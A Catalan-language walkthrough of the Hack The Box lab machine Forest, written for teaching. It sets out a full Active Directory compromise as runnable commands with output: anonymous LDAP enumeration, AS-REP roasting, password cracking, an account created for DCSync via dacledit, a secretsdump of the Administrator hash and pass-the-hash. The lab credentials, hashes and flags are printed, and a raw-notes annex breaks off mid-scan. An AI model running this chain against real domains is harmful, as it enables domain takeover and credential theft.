# HTB Forest — Writeup tècnic didàctic

## Fitxa del laboratori

| Camp | Valor |
|---|---|
| Plataforma | Hack The Box |
| Màquina | Forest |
| Dificultat | Easy |
| Sistema identificat | Windows Server 2016 Standard 14393 |
| Rol dominant | Controlador de Domini Active Directory |
| Domini | `htb.local` / `HTB.LOCAL` |
| Hostname | `FOREST` |
| FQDN | `FOREST.htb.local` |
| IP inicial observada | `10.129.34.129` |
| IP final després de la reconnexió | `10.129.95.210` |
| Usuari compromès | `svc-alfresco` |
| Credencial recuperada | `svc-alfresco:s3rvice` |
| Compte controlat creat | `r4mforest:R4mForest!26` |
| Hash NTLM d'Administrator obtingut | `32693b11e6aa90eb43d32c72a07ceea6` |
| Estat | Resolta |

## Resum executiu

Forest és una màquina orientada a Active Directory. La fase inicial de reconeixement mostra ràpidament un perfil de Controlador de Domini: DNS, Kerberos, LDAP, SMB, Global Catalog, ADWS i WinRM apareixen exposats al mateix host. Encara que també existeixen serveis HTTP associats a Microsoft HTTPAPI, no constitueixen una aplicació web principal; en aquesta màquina són senyals auxiliars de serveis Windows i d'administració remota.

La cadena de compromís es basa en una seqüència clàssica i molt formativa:

```text
LDAP anonymous bind
-> enumeració d'objectes del domini
-> identificació de svc-alfresco
-> ASREPRoasting
-> craqueig offline de l'AS-REP
-> credencial vàlida per a svc-alfresco
-> accés WinRM
-> identificació d'Account Operators
-> anàlisi de relacions amb BloodHound
-> abús d'Exchange Windows Permissions amb WriteDacl sobre el domini
-> concessió de permisos DCSync a un compte controlat
-> extracció del hash d'Administrator
-> pass-the-hash
-> accés administratiu i root.txt
```

La màquina ensenya tres idees centrals. La primera és que l'enumeració LDAP en Active Directory pot revelar una ruta completa si s'interpreta correctament. La segona és que Kerberos no només serveix per a autenticació, sinó que també pot ser una superfície d'atac quan un compte té desactivada la preautenticació. La tercera és que l'escalada en Active Directory no sempre passa per privilegis locals immediats: sovint es construeix encadenant grups, ACLs i permisos delegats.

## Abast i criteri de documentació

Aquest document reconstrueix la resolució real del laboratori a partir de l'evidència observada. No es presenta una ruta alternativa ni una explotació inventada. Quan una sortida va ser ambigua, s'indica com a tal. Quan una prova va fallar per seqüència o per entorn, es conserva com a part de l'aprenentatge tècnic, perquè aquests errors ajuden a entendre millor la metodologia.

En el cos principal es conserva la part didàctica útil dels apunts: per què es va escollir cada branca, quin comandament tenia sentit en cada punt, quina sortida importava i com canviava la decisió següent. Al final s'inclou un annex amb els apunts originals complets com a traçabilitat.

## 1. Preparació i arrencada del laboratori

La màquina es va iniciar amb el flux habitual de treball mitjançant l'script `Inici-HTB`, que prepara el directori de l'objectiu, comprova connectivitat, executa un reconeixement ràpid del sistema i llança els escanejos inicials.

```bash
Inici-HTB FOREST 10.129.34.129
```

### Fet verificat

La connectivitat inicial va ser correcta:

```text
PING 10.129.34.129
1 packets transmitted, 1 received, 0% packet loss
```

El TTL observat va ser `127`, compatible amb un sistema Windows. L'eina d'identificació ràpida també va classificar l'objectiu com a Windows.

### Lectura didàctica

El TTL no s'ha de prendre com a prova absoluta del sistema operatiu, però sí com un senyal primerenc útil. En aquest cas, aquest senyal es va veure reforçat després per Nmap i SMB, de manera que va quedar validat dins d'un conjunt d'evidències més ampli.

## 2. Enumeració inicial amb Nmap

L'escaneig complet de ports va mostrar una superfície àmplia i molt característica d'un entorn Active Directory.

### Ports rellevants

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm / Microsoft HTTPAPI
49664-50033/tcp open serveis RPC dinàmics
```

L'escaneig de serveis va identificar el domini i l'host:

```text
Domain: htb.local
Host: FOREST
FQDN: FOREST.htb.local
OS: Windows Server 2016 Standard 14393
```

### Interpretació

La combinació de `53`, `88`, `389`, `445`, `3268`, `3269` i `9389` és un senyal fort de Controlador de Domini. El port `5985/tcp` indica WinRM, que serà útil més endavant si s'obté una credencial vàlida. Els serveis HTTP identificats com `Microsoft-HTTPAPI/2.0` retornen `Not Found`, de manera que no justifiquen obrir una branca web principal.

### Decisió de branca

La superfície dominant passa a ser:

```text
AD / LDAP / Kerberos / SMB
```

Les branques secundàries queden anotades així:

- WinRM: pendent de credencials vàlides.
- SMB: útil com a validació i enumeració complementària.
- HTTPAPI: no es considera aplicació web principal.

## 3. Resolució local del domini

En Active Directory convé treballar amb noms de domini i FQDN, no només amb adreces IP. Les eines relacionades amb LDAP, Kerberos o SMB poden dependre de la resolució correcta del domini.

```bash
echo '10.129.34.129 forest.htb.local htb.local FOREST' | sudo tee -a /etc/hosts
getent hosts htb.local
getent hosts forest.htb.local
```

### Fet verificat

Inicialment la resolució va quedar associada a `10.129.34.129`. Més endavant, després d'una reconnexió d'HTB, la IP de la màquina va canviar a `10.129.95.210`, i per això va ser necessari corregir `/etc/hosts`:

```bash
sudo cp /etc/hosts /etc/hosts.bak_$(date +%Y%m%d_%H%M%S)
echo '10.129.95.210 forest.htb.local htb.local FOREST' | sudo tee -a /etc/hosts
getent hosts htb.local
getent hosts forest.htb.local
getent hosts FOREST
```

La resolució final va quedar correctament apuntant a:

```text
10.129.95.210 forest.htb.local htb.local FOREST
```

### Lliçó reutilitzable

Quan una màquina HTB es reconnecta i canvia d'IP, no n'hi ha prou amb modificar els comandaments manualment. En Active Directory també cal revisar `/etc/hosts`, perquè una resolució antiga pot provocar errors confusos en Kerberos, LDAP o eines d'Impacket.

## 4. LDAP anonymous bind

Com que Nmap va identificar LDAP i Global Catalog, el pas lògic següent va ser comprovar si el domini permetia consultes anònimes.

```bash
ldapsearch -x -H ldap://10.129.34.129:389 -b "dc=htb,dc=local" \
  > content/ldap/ldap_anonymous_full.ldif
```

### Per què s'usa aquest comandament

`ldapsearch` permet consultar el directori. L'opció `-x` força autenticació simple. En no proporcionar usuari ni contrasenya, la prova intenta una consulta anònima. La base `dc=htb,dc=local` deriva del domini observat a Nmap.

### Fet verificat

La consulta va retornar objectes del domini sense credencials. Això confirma un `LDAP anonymous bind` funcional.

Per reduir soroll, es van extreure camps rellevants:

```bash
grep -Ei 'dn:|sAMAccountName|userPrincipalName|memberOf|servicePrincipalName|userAccountControl' \
  content/ldap/ldap_anonymous_full.ldif \
  | tee content/ldap/ldap_interesting_fields.txt
```

### Lectura de la sortida

La sortida va revelar una estructura rica del domini:

- usuaris i grups integrats;
- comptes i bústies d'Exchange;
- equips `FOREST$` i `EXCH01$`;
- grups de seguretat d'Exchange;
- usuaris humans (`sebastien`, `santi`, `lucinda`, `andy`, `mark`);
- el compte `svc-alfresco` dins de `OU=Service Accounts`.

La troballa més important va ser:

```text
CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
```

### Interpretació

L'aparició de `svc-alfresco` no demostra per si sola una vulnerabilitat, però sí identifica un compte de servei candidat. Els comptes de servei acostumen a ser rellevants perquè poden estar configurats per compatibilitat amb integracions, autenticació heretada o polítiques menys estrictes.

## 5. Neteja d'usuaris i primer error útil

La primera llista d'usuaris es va generar a partir de tots els `sAMAccountName` de l'LDIF:

```bash
grep -i 'sAMAccountName:' content/ldap/ldap_anonymous_full.ldif \
  | awk '{print $2}' \
  | sort -u \
  | tee content/users/domain_users_raw.txt
```

### Problema observat

La llista resultant no era una llista neta d'usuaris. Incloïa grups i objectes amb espais tallats per `awk`. Per exemple, `Remote Management Users` podia aparèixer reduït a `Remote`.

### Correcció metodològica

Per evitar barrejar usuaris, grups i objectes de sistema, es va repetir la consulta filtrant objectes d'usuari reals:

```bash
ldapsearch -x -H ldap://10.129.95.210:389 -b "dc=htb,dc=local" \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName userPrincipalName userAccountControl memberOf description servicePrincipalName \
  | tee content/ldap/ldap_users_clean.ldif
```

Després es va crear una llista més neta:

```bash
grep -i '^sAMAccountName:' content/ldap/ldap_users_clean.ldif \
  | awk '{print $2}' \
  | sort -u \
  | tee content/users/domain_users_clean.txt
```

### Usuaris humans observats

```text
sebastien
lucinda
andy
mark
santi
```

### Lliçó reutilitzable

En Active Directory, no tot `sAMAccountName` és un compte humà útil per a Kerberos. Hi ha bústies, comptes interns, equips, grups i objectes de sistema. Abans d'usar una llista com a entrada per a eines Kerberos, convé depurar-la amb filtres LDAP adequats.

## 6. Validació de svc-alfresco i ASREPRoasting

La ruta d'ASREPRoasting requereix una condició concreta: un compte d'usuari ha de tenir deshabilitada la preautenticació Kerberos. En els apunts es va intentar generar un fitxer de candidats mitjançant LDAP, però es va produir un error de seqüència: es va executar `grep` sobre un fitxer `asrep_candidates.ldif` que encara no existia. Això va crear un `asrep_candidates.txt` buit.

### Per què aquest error importa

Una llista buida no produeix una prova negativa. Si `GetNPUsers` s'executa amb un fitxer sense usuaris, no s'està comprovant realment el compte candidat. En aquest cas, la manca de sortida no significava que `svc-alfresco` no fos vulnerable, sinó que l'eina no va rebre cap usuari vàlid.

### Correcció pràctica

Atès que `svc-alfresco` ja havia aparegut com a objecte sota `OU=Service Accounts`, es va crear una llista mínima amb aquest compte:

```bash
printf 'svc-alfresco\n' | tee content/users/asrep_candidates.txt
```

Després es va sol·licitar l'AS-REP amb Impacket:

```bash
impacket-GetNPUsers htb.local/ \
  -dc-ip 10.129.95.210 \
  -usersfile content/users/asrep_candidates.txt \
  -no-pass \
  -outputfile loot/ad/asrep_hashes.txt
```

### Fet verificat

Kerberos va retornar un hash AS-REP per al compte:

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

### Interpretació

Això confirma que `svc-alfresco` no requereix preautenticació Kerberos. ASREPRoasting no necessita conèixer la contrasenya prèviament; sol·licita material xifrat que es pot atacar offline. El valor de la troballa és que l'atac posterior no genera intents de login contra el domini.

## 7. Craqueig offline de l'AS-REP

El hash obtingut es va atacar offline amb John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt loot/ad/asrep_hashes.txt
john --show loot/ad/asrep_hashes.txt | tee loot/ad/asrep_cracked.txt
```

### Fet verificat

John va recuperar la contrasenya:

```text
svc-alfresco:s3rvice
```

### Validació de credencials

La contrasenya es va validar primer contra SMB:

```bash
netexec smb 10.129.95.210 -u svc-alfresco -p 's3rvice'
```

La sortida va confirmar autenticació vàlida:

```text
[+] htb.local\svc-alfresco:s3rvice
```

Després es va validar WinRM:

```bash
netexec winrm 10.129.95.210 -u svc-alfresco -p 's3rvice'
```

La sortida rellevant va ser:

```text
[+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

### Implicació

La credencial no només és vàlida per al domini; també permet obrir una sessió remota per WinRM. Això canvia la branca activa: deixa de ser una fase purament Kerberos i passa a ser una fase de foothold inicial.

## 8. Accés inicial per WinRM i obtenció de user.txt

La sessió remota es va obrir amb Evil-WinRM:

```bash
evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

Dins de la sessió es va verificar el context:

```powershell
whoami
hostname
whoami /user
whoami /groups
pwd
```

### Fets verificats

```text
whoami  -> htb\svc-alfresco
hostname -> FOREST
pwd      -> C:\Users\svc-alfresco\Documents
```

El SID de l'usuari va ser:

```text
S-1-5-21-3072663084-364016917-1341370565-1147
```

La flag d'usuari era a:

```powershell
dir C:\Users\svc-alfresco\Desktop
type C:\Users\svc-alfresco\Desktop\user.txt
```

Flag obtinguda:

```text
789fa35a3fbdddb31ceee14fa4bdc109
```

### Lectura de grups

La sortida de `whoami /groups` va ser més important que la mateixa flag. Va mostrar que `svc-alfresco` pertanyia a:

```text
BUILTIN\Remote Management Users
BUILTIN\Account Operators
HTB\Privileged IT Accounts
HTB\Service Accounts
```

### Interpretació

`Remote Management Users` explica l'accés per WinRM. `Service Accounts` explica el context funcional del compte. La dada crítica és `Account Operators`, perquè aquest grup pot crear i modificar comptes i afegir usuaris a certs grups no protegits. L'escalada deixa de ser una cerca local clàssica i passa a ser un problema de permisos d'Active Directory.

## 9. Intent de SharpHound i canvi a bloodhound-python

La fase següent requeria analitzar relacions de domini. Primer es va intentar pujar i executar `SharpHound.exe` des de la sessió WinRM:

```powershell
upload SharpHound.exe
.\SharpHound.exe -c All
```

### Fet verificat

La pujada va funcionar, però l'execució va fallar per incompatibilitat de .NET:

```text
The .Net Runtime is not compatible with SharpHound. Please update to .Net 4.7.2.
```

### Decisió tècnica

No calia insistir amb aquesta versió de SharpHound. La recol·lecció es podia fer des de Parrot amb `bloodhound-python`, evitant dependre del runtime .NET de la víctima.

```bash
cd /home/r4mon/pentest/targets/HTB/easy/FOREST
mkdir -p content/bloodhound
cd content/bloodhound

bloodhound-python \
  -u 'svc-alfresco' \
  -p 's3rvice' \
  -d htb.local \
  -dc forest.htb.local \
  -ns 10.129.95.210 \
  -c All
```

### Resultat

L'eina va trobar:

```text
1 domini
2 equips
32 usuaris
76 grups
2 GPOs
15 OUs
20 contenidors
0 trusts
```

Es van generar els JSON principals:

```text
computers.json
containers.json
domains.json
gpos.json
groups.json
ous.json
users.json
```

I es van comprimir per a BloodHound:

```bash
zip forest_bloodhound_$(date +%Y%m%d_%H%M%S).zip *.json
```

Fitxer generat:

```text
content/bloodhound/forest_bloodhound_20260429_170450.zip
```

### Nota sobre clock skew

Durant la recol·lecció va aparèixer:

```text
KRB_AP_ERR_SKEW(Clock skew too great)
```

Això indica un desfasament horari que pot afectar Kerberos. Tot i això, la recol·lecció va obtenir dades LDAP suficients per analitzar usuaris, grups, OUs i ACLs.

## 10. Revisió dirigida de BloodHound amb jq

Un `grep` ampli sobre els JSON va resultar massa sorollós. Els JSON de BloodHound no estan pensats per llegir-se en brut. Es va passar a consultes més dirigides amb `jq`.

### Usuaris rellevants

```bash
jq -r '.data[].Properties.name' content/bloodhound/*users.json \
  | grep -Ei 'svc-alfresco|sebastien|lucinda|andy|mark|santi'
```

Sortida clau:

```text
SANTI@HTB.LOCAL
ANDY@HTB.LOCAL
MARK@HTB.LOCAL
SVC-ALFRESCO@HTB.LOCAL
LUCINDA@HTB.LOCAL
SEBASTIEN@HTB.LOCAL
```

### Grups rellevants

```bash
jq -r '.data[].Properties.name' content/bloodhound/*groups.json \
  | grep -Ei 'account operators|exchange windows permissions|domain admins|remote management users|service accounts|privileged it accounts'
```

Sortida clau:

```text
PRIVILEGED IT ACCOUNTS@HTB.LOCAL
SERVICE ACCOUNTS@HTB.LOCAL
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
ACCOUNT OPERATORS@HTB.LOCAL
DOMAIN ADMINS@HTB.LOCAL
REMOTE MANAGEMENT USERS@HTB.LOCAL
```

### Objecte de svc-alfresco

```bash
jq '.data[] | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL")' \
  content/bloodhound/*users.json
```

Camps rellevants:

```text
enabled: true
dontreqpreauth: true
pwdneverexpires: true
hasspn: false
admincount: true
samaccountname: svc-alfresco
```

### Interpretació

`dontreqpreauth: true` confirma retrospectivament per què va funcionar ASREPRoasting. `hasspn: false` indica que aquest compte no era candidat directe a Kerberoasting per SPN. El bloc d'`Aces` de l'objecte `svc-alfresco` no s'ha de confondre amb permisos que `svc-alfresco` tingui sobre altres objectes: són ACLs sobre el mateix objecte de l'usuari.

## 11. Confirmació de WriteDacl sobre el domini

La ruta probable passava per `Exchange Windows Permissions`, per això se'n va extreure el SID:

```bash
EWP_SID=$(jq -r '.data[]
  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
  | .ObjectIdentifier' content/bloodhound/*groups.json)

echo "$EWP_SID"
```

SID obtingut:

```text
S-1-5-21-3072663084-364016917-1341370565-1121
```

Després es van comprovar les ACLs del domini:

```bash
jq -r --arg EWP "$EWP_SID" '
  .data[]
  | select(.Properties.name=="HTB.LOCAL")
  | .Aces[]?
  | select(.PrincipalSID==$EWP)
  | [.RightName, .PrincipalType, .IsInherited] | @tsv
' content/bloodhound/*domains.json
```

### Fet verificat

La sortida va confirmar:

```text
WriteDacl    Group    false
WriteDacl    Group    false
```

L'objecte domini era:

```text
DC=HTB,DC=LOCAL
```

i estava marcat com a objectiu d'alt valor.

### Implicació

La relació crítica queda confirmada:

```text
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL -- WriteDacl --> HTB.LOCAL
```

Això permet construir una ruta d'escalada sense afegir directament un compte a `Domain Admins`. La idea és abusar de `WriteDacl` sobre el domini per concedir permisos de replicació tipus DCSync a un compte controlat.

## 12. Creació d'un compte controlat

Per no alterar usuaris existents, es va crear un compte nou de domini anomenat `r4mforest`.

### Primer intent i correcció

El primer intent va usar una contrasenya de més de 14 caràcters. `net user` va llançar una pregunta interactiva de compatibilitat amb sistemes anteriors a Windows 2000, i Evil-WinRM no va gestionar bé la resposta. L'usuari no es va crear.

La correcció va ser usar una contrasenya complexa però de 14 caràcters o menys:

```text
R4mForest!26
```

### Creació i pertinences

Els comandaments es van executar dins d'Evil-WinRM com `svc-alfresco`:

```powershell
net user r4mforest R4mForest!26 /add /domain
net user r4mforest /domain
net group "Exchange Windows Permissions" r4mforest /add /domain
net localgroup "Remote Management Users" r4mforest /add
net user r4mforest /domain
```

### Fet verificat

El compte va quedar creat i actiu. Les pertinences observades van ser:

```text
Domain Users
Exchange Windows Permissions
Remote Management Users
```

### Interpretació

Això confirma que `svc-alfresco`, per la seva pertinença a `Account Operators`, pot crear usuaris i modificar grups no protegits. `Exchange Windows Permissions` no està marcat com a grup protegit, de manera que s'hi va poder afegir el compte controlat.

La ruta queda preparada:

```text
r4mforest
-> membre d'Exchange Windows Permissions
-> grup amb WriteDacl sobre HTB.LOCAL
-> possibilitat de concedir permisos DCSync
```

## 13. Concessió de DCSync amb impacket-dacledit

Inicialment es va contemplar usar PowerView i `Add-ObjectACL`, però `PowerView.ps1` no estava disponible a la carpeta d'eines. En lloc de bloquejar la fase, es va usar `impacket-dacledit` des de Parrot.

### Per què dacledit té sentit

PowerView i `impacket-dacledit` poden servir per modificar ACLs. La diferència pràctica és el lloc d'execució:

```text
PowerView          -> s'executa dins de Windows, per WinRM
impacket-dacledit  -> s'executa des de Parrot contra LDAP/AD
```

Com que `r4mforest` ja estava dins d'`Exchange Windows Permissions`, i aquest grup tenia `WriteDacl` sobre el domini, `dacledit` era una via directa i neta.

### Comandament executat

```bash
impacket-dacledit \
  -action write \
  -rights DCSync \
  -principal r4mforest \
  -target-dn 'DC=htb,DC=local' \
  'htb.local/r4mforest:R4mForest!26' \
  -dc-ip 10.129.95.210
```

### Fet verificat

La sortida va confirmar:

```text
[*] DACL backed up to dacledit-20260429-175029.bak
[*] DACL modified successfully!
```

Això significa que l'ACL del domini va ser modificada i que `r4mforest` va rebre permisos de replicació suficients per intentar DCSync.

## 14. Extracció del hash d'Administrator amb secretsdump

Amb els permisos DCSync aplicats, es va executar `secretsdump` limitant l'extracció a l'usuari `Administrator`:

```bash
impacket-secretsdump \
  'htb.local/r4mforest:R4mForest!26@10.129.95.210' \
  -just-dc-user Administrator \
  -outputfile loot/ad/secretsdump_administrator
```

### Fet verificat

`secretsdump` va usar DRSUAPI per obtenir secrets de `NTDS.DIT`:

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

Es va obtenir el hash NTLM d'`Administrator`:

```text
32693b11e6aa90eb43d32c72a07ceea6
```

També es van obtenir claus Kerberos AES i DES de l'usuari administrador.

### Interpretació

DCSync no consisteix a trencar la contrasenya de l'administrador. Consisteix a abusar de permisos de replicació del domini per sol·licitar secrets del directori. L'impacte és crític: si un compte pot replicar secrets, pot obtenir hashes de comptes privilegiats.

## 15. Accés administratiu mitjançant pass-the-hash

No va ser necessari craquejar el hash d'`Administrator`. En Windows, el hash NTLM es pot reutilitzar directament en certs protocols mitjançant pass-the-hash.

```bash
evil-winrm -i 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

Dins de la sessió:

```powershell
whoami
hostname
pwd
```

### Fet verificat

```text
whoami  -> htb\administrator
hostname -> FOREST
pwd      -> C:\Users\Administrator\Documents
```

La flag final era a:

```powershell
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\root.txt
```

Flag obtinguda:

```text
2a7cbb6f92926190213605fa2ba841d3
```

### Tancament tècnic

El compromís administratiu queda confirmat. La màquina queda resolta.

## 16. Cadena tècnica final

```text
1. Nmap identifica un Controlador de Domini Windows Server 2016.
2. LDAP anonymous bind permet enumerar objectes del domini.
3. L'enumeració revela svc-alfresco a OU=Service Accounts.
4. Kerberos entrega un AS-REP per a svc-alfresco.
5. John craqueja el hash i recupera s3rvice.
6. SMB i WinRM validen la credencial.
7. Evil-WinRM permet accedir com htb\svc-alfresco.
8. whoami /groups revela Account Operators.
9. BloodHound confirma usuaris, grups i relacions rellevants.
10. Exchange Windows Permissions té WriteDacl sobre HTB.LOCAL.
11. svc-alfresco crea r4mforest i l'afegeix a Exchange Windows Permissions.
12. impacket-dacledit concedeix DCSync a r4mforest.
13. secretsdump extreu el hash NTLM d'Administrator.
14. Evil-WinRM usa pass-the-hash amb Administrator.
15. S'obté root.txt.
```

## 17. Lliçons reutilitzables

### 17.1. Un DC es reconeix per un conjunt de senyals, no per un port aïllat

`88/tcp`, `389/tcp`, `445/tcp`, `3268/tcp`, `3269/tcp`, `9389/tcp`, domini visible i FQDN de l'host formen una evidència molt més forta que qualsevol port individual. La classificació correcta de la superfície evita perdre temps en branques web falses.

### 17.2. LDAP anonymous bind pot ser suficient per iniciar una cadena completa

A Forest, LDAP va permetre llegir estructura interna del domini, usuaris, OUs, objectes d'Exchange i comptes de servei. Aquesta enumeració no és explotació directa, però proporciona la informació necessària per decidir la tècnica següent.

### 17.3. Les llistes d'usuaris s'han de depurar

Extreure tots els `sAMAccountName` sense filtrar pot produir llistes contaminades amb grups, equips i objectes interns. Abans d'usar Kerberos o eines d'atac de contrasenyes, convé filtrar per usuaris reals.

### 17.4. Una llista buida no és una prova negativa

L'intent fallit amb `asrep_candidates.txt` buit no demostrava que `svc-alfresco` no fos vulnerable. Només indicava que l'eina no va rebre usuaris. Documentar aquest tipus d'error evita descartar hipòtesis vàlides per errors de seqüència.

### 17.5. ASREPRoasting confirma una mala configuració de Kerberos

`dontreqpreauth: true` permet sol·licitar material xifrat sense conèixer prèviament la contrasenya. L'atac rellevant ocorre offline, durant el craqueig del hash.

### 17.6. La flag de user no és la troballa més important

El veritable pivot va ser `whoami /groups`. La pertinença a `Account Operators` va permetre passar d'accés inicial a una ruta d'escalada de domini.

### 17.7. BloodHound no s'analitza amb grep ampli

Els JSON de BloodHound contenen moltes relacions imbricades. Per a comprovacions ràpides, `jq` és més precís. Per a rutes completes, la interfície visual de BloodHound continua sent l'eina més adequada.

### 17.8. WriteDacl sobre el domini és una primitiva crítica

`Exchange Windows Permissions` no era un grup d'administradors del domini, però tenia `WriteDacl` sobre `HTB.LOCAL`. Aquesta relació va permetre concedir permisos DCSync a un compte controlat.

### 17.9. DCSync canvia l'impacte de la intrusió

Un compte amb permisos DCSync pot sol·licitar secrets del domini. En obtenir el hash d'`Administrator`, el compromís passa d'usuari amb privilegis delegats a control administratiu efectiu.

### 17.10. Pass-the-hash evita dependre de la contrasenya en clar

El hash NTLM d'`Administrator` va ser suficient per obrir WinRM com a administrador. No va ser necessari craquejar la contrasenya.

## 18. Evidències principals

| Fase | Evidència |
|---|---|
| Classificació | `FOREST.htb.local`, `htb.local`, Windows Server 2016, ports AD |
| LDAP | Consulta anònima retorna objectes del domini |
| Compte candidat | `CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local` |
| ASREPRoasting | `$krb5asrep$23$svc-alfresco@HTB.LOCAL:...` |
| Craqueig | `svc-alfresco:s3rvice` |
| Validació | `netexec winrm ... (Pwn3d!)` |
| Foothold | `htb\svc-alfresco` per Evil-WinRM |
| User flag | `789fa35a3fbdddb31ceee14fa4bdc109` |
| Pivot | `BUILTIN\Account Operators` |
| BloodHound | `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL` existeix |
| ACL crítica | `WriteDacl` sobre `HTB.LOCAL` |
| Compte controlat | `r4mforest:R4mForest!26` |
| DCSync | `DACL modified successfully!` i `secretsdump` per DRSUAPI |
| Hash Administrator | `32693b11e6aa90eb43d32c72a07ceea6` |
| Admin | `htb\administrator` per Evil-WinRM |
| Root flag | `2a7cbb6f92926190213605fa2ba841d3` |

## 19. Punts ambigus i correccions editorials aplicades

No s'ha canviat la cadena tècnica del laboratori. La resolució documentada coincideix amb l'evidència observada als apunts.

S'han aplicat correccions editorials en el cos principal:

- normalització d'errades evidents com `nuestrro`, `escript`, `entrorno` o usos inconsistents de `Ip`;
- reorganització de blocs repetitius per evitar una plantilla mecànica d'objectiu, mètode i resposta en cada microfase;
- reducció de sortides excessivament llargues en el cos principal, conservant-ne les parts rellevants;
- manteniment de l'error operatiu de la llista ASREP buida com a aprenentatge metodològic;
- conservació de la reconnexió i canvi d'IP com a part real del procés;
- substitució de la via PowerView per `impacket-dacledit` únicament perquè va ser la ruta realment usada en no existir `PowerView.ps1` a `tools`.

No s'han inventat validacions ni passos nous. Quan es va interpretar una sortida, es va fer a partir d'evidència registrada als apunts.

## 20. Annex A — Apunts originals conservats

El bloc següent conserva els apunts originals de treball com a traçabilitat del procés. Es mantenen fins i tot quan contenen repeticions, sortides llargues, decisions intermèdies o errors de seqüència, perquè formen part del recorregut real del laboratori.

````text
### Iniciamos la explotación de la máquina Forest de Hack The Box.

## Síntesis técnica – Forest

Forest es una máquina orientada a una cadena clásica de compromiso en Active Directory, con especial foco en la enumeración de servicios de dominio y en el abuso progresivo de privilegios mal delegados. La resolución parte de la obtención de información del dominio a través de mecanismos de consulta insuficientemente restringidos, continúa con técnicas de abuso de autenticación Kerberos para recuperar credenciales válidas y evoluciona hacia una fase de post-explotación centrada en grupos con privilegios operativos sobre la infraestructura de Exchange. A partir de ahí, la máquina obliga a comprender cómo ciertos permisos indirectos pueden traducirse en control efectivo del dominio, culminando en una ruta de escalada que permite replicar secretos de Active Directory y comprometer por completo el entorno. En términos formativos, es una máquina muy valiosa para afianzar metodología de enumeración AD, lectura de relaciones de privilegio y comprensión de cadenas de ataque basadas en LDAP, Kerberos, grupos privilegiados y DCSync. La cadena técnica descrita por HTB incluye precisamente esos elementos.

## Valor técnico real
Forest es de esas máquinas que enseñan mucho porque no depende de un truco raro, sino de una cadena AD muy pedagógica y muy reutilizable. Como entrenamiento para pasar de “Windows básico” a “entender de verdad por qué cae un dominio”, me parece de las más útiles. Esto último ya es valoración mía, apoyada en la ruta oficial que HTB resume.

## Iniciamos el proceso ejecutando nuestrro escript Inici-HTB que nos montará el entrorno de trabajo y la ejecución de los escaneos iniciales. En este caso la salida del script es la siguiente:

## ❯ Inici-HTB FOREST 10.129.34.129
[*] Fijando objetivo en Polybar con settarget
[*] Preparando directorio base
[*] Comprobando conectividad inicial
PING 10.129.34.129 (10.129.34.129) 56(84) bytes of data.
64 bytes from 10.129.34.129: icmp_seq=1 ttl=127 time=48.1 ms

--- 10.129.34.129 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.100/48.100/48.100/0.000 ms
[*] Intentando identificación rápida con whichSystem.py

10.129.34.129 (ttl -> 127): Windows

[*] Lanzando escaneo completo de puertos
[sudo] contraseña para r4mon:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-26 12:24 CEST
Initiating SYN Stealth Scan at 12:24
Scanning 10.129.34.129 [65535 ports]
Discovered open port 53/tcp on 10.129.34.129
Discovered open port 135/tcp on 10.129.34.129
Discovered open port 445/tcp on 10.129.34.129
Discovered open port 139/tcp on 10.129.34.129
Discovered open port 49671/tcp on 10.129.34.129
Discovered open port 49666/tcp on 10.129.34.129
Discovered open port 49676/tcp on 10.129.34.129
Discovered open port 464/tcp on 10.129.34.129
Discovered open port 88/tcp on 10.129.34.129
Discovered open port 389/tcp on 10.129.34.129
Discovered open port 49677/tcp on 10.129.34.129
Discovered open port 49664/tcp on 10.129.34.129
Discovered open port 49665/tcp on 10.129.34.129
Discovered open port 49681/tcp on 10.129.34.129
Discovered open port 636/tcp on 10.129.34.129
Discovered open port 50033/tcp on 10.129.34.129
Discovered open port 9389/tcp on 10.129.34.129
Discovered open port 49668/tcp on 10.129.34.129
Discovered open port 5985/tcp on 10.129.34.129
Discovered open port 47001/tcp on 10.129.34.129
Discovered open port 3268/tcp on 10.129.34.129
Discovered open port 3269/tcp on 10.129.34.129
Discovered open port 49698/tcp on 10.129.34.129
Discovered open port 593/tcp on 10.129.34.129
Completed SYN Stealth Scan at 12:24, 13.22s elapsed (65535 total ports)
Nmap scan report for 10.129.34.129
Host is up, received user-set (0.046s latency).
Scanned at 2026-04-26 12:24:24 CEST for 13s
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
